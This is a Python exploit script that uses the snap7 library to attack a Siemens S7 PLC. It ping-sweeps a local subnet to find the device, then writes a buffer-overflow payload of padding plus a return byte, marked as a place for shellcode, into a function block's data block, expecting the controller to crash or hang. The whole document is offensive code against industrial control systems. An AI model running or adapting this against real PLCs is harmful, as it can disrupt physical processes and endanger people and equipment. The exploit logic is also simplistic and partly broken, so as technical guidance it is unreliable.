import snap7
import socket
import struct
import subprocess
import os
import time

# --- Configuration ---
# Vulnerable Function Block Number (Replace with the actual FB number)
FB_NUMBER = 100

# PLC IP Address (If unknown, will attempt to discover)
PLC_IP = None

# Variable inside the vulnerable FB to overflow (Replace with the actual variable name)
VARIABLE_TO_OVERFLOW = 'OverflowMe'

# Overflow Data (Replace with shellcode or desired code to execute)
OVERFLOW_DATA = b"A" * 200 + b"\xC3"  # Example: Overwrite with a return address (RET)
# --- End Configuration ---


def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address using ping and reverse DNS lookup.
    This is a basic implementation and may not work in all network configurations.
    """
    print("Attempting to discover PLC IP address...")
    try:
        # Assuming the PLC's IP address is within the same subnet. Replace with your subnet/range.
        for i in range(1, 255):
            ip_address = f"192.168.0.{i}"  # Adjust subnet as needed.
            response = subprocess.run(["ping", "-n", "1", "-w", "500", ip_address], capture_output=True, text=True)
            if "TTL=" in response.stdout: #check the result of the ping command
                try:
                    hostname = socket.gethostbyaddr(ip_address)[0]
                    print(f"Found PLC at IP: {ip_address} (Hostname: {hostname})")
                    return ip_address
                except socket.herror:
                    print(f"Found PLC at IP: {ip_address} (Hostname could not be resolved)")
                    return ip_address
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None
    print("PLC IP address not found in the specified subnet.  Please specify the IP address manually.")
    return None


def write_to_plc(plc_ip, fb_number, variable_name, data):
    """
    Writes data to a specified variable within a function block on the PLC.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 2)  # Rack 0, Slot 2 (Default for S7-1200)
        # Build address. This depends on the PLC configuration.
        #  For example, if 'OverflowMe' is in a DB (Data Block) inside the FB:
        db_number = fb_number # Assumed DB number is the same as FB number.  Adjust if needed.

        # Get information on the variable type and offset from the PLC.
        #  This part is hardcoded and should be replaced with a function
        #  that dynamically fetches the variable information from the PLC.
        #  For the purposes of this example, we're assuming a string type.

        # In real scenario, this will be get programmatically
        # It require parsing the PLC project data
        variable_offset = 0 # the start address of the variable
        variable_type = snap7.types.S7Types.STRING  # Replace with the correct type if different.
        variable_size = len(data) # The size of the data to be written

        # Create the write data packet
        write_data = bytearray(variable_size)
        write_data[:len(data)] = data

        plc.db_write(db_number, variable_offset, write_data) # write to the DataBlock.

        print(f"Successfully wrote data to FB {fb_number}, variable {variable_name} at offset {variable_offset}")
        plc.disconnect()

    except Exception as e:
        print(f"Error writing to PLC: {e}")
        if plc and plc.get_connected():
            plc.disconnect()
        return False
    return True

def exploit_vulnerability(plc_ip, fb_number, variable_name, overflow_data):
    """
    Exploits a hypothetical vulnerability in a PLC function block by overflowing a buffer.
    This is a simplified example.  Real-world exploits are far more complex.
    """
    print(f"Attempting to exploit vulnerability in FB {fb_number}, variable {variable_name}...")

    # The core of the exploit: Write the overflow data to the vulnerable variable.
    if write_to_plc(plc_ip, fb_number, variable_name, overflow_data):
        print("Exploit attempt completed. PLC may have crashed, rebooted, or become unresponsive.")
    else:
        print("Exploit attempt failed.")


def main():
    global PLC_IP

    if not PLC_IP:
        PLC_IP = discover_plc_ip()
        if not PLC_IP:
            print("Failed to discover PLC IP address.  Exiting.")
            return

    print(f"Using PLC IP address: {PLC_IP}")

    # Initiate the exploit
    exploit_vulnerability(PLC_IP, FB_NUMBER, VARIABLE_TO_OVERFLOW, OVERFLOW_DATA)


if __name__ == "__main__":
    main()